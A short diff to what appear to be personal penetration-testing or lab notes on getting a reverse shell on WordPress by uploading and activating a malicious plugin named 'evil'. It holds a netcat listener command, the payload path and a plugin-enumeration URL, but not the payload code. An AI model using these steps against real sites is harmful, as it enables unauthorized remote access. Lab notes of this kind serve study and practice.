@@ -247,7 +247,7 @@ zip evil evil
 
 open a netcat listener using nc -lvnp 443
 
-uploading and activating the plugin launches the connection!
+uploading and activating the plugin launches the connection! navigating to the page is not necessary!
 
 maybe useful urls:?
 /wp-admin/plugins.php?plugin_status=all&paged=1&s -- list all plugins
@@ -255,7 +255,8 @@ maybe useful urls:?
 The plugin was uploaded to /var/www/wordpress/wp-content/plugins/evil
 with the payload at /var/www/wordpress/wp-content/plugins/evil/evil.php
 
-
+another example is if I wanted to access wpforms lite readme.txt. WP Plugins generally put a dash wherever a space is
+http://alvida-eatery.org/wp-content/plugins/wpforms-lite/readme.txt
 
 
 
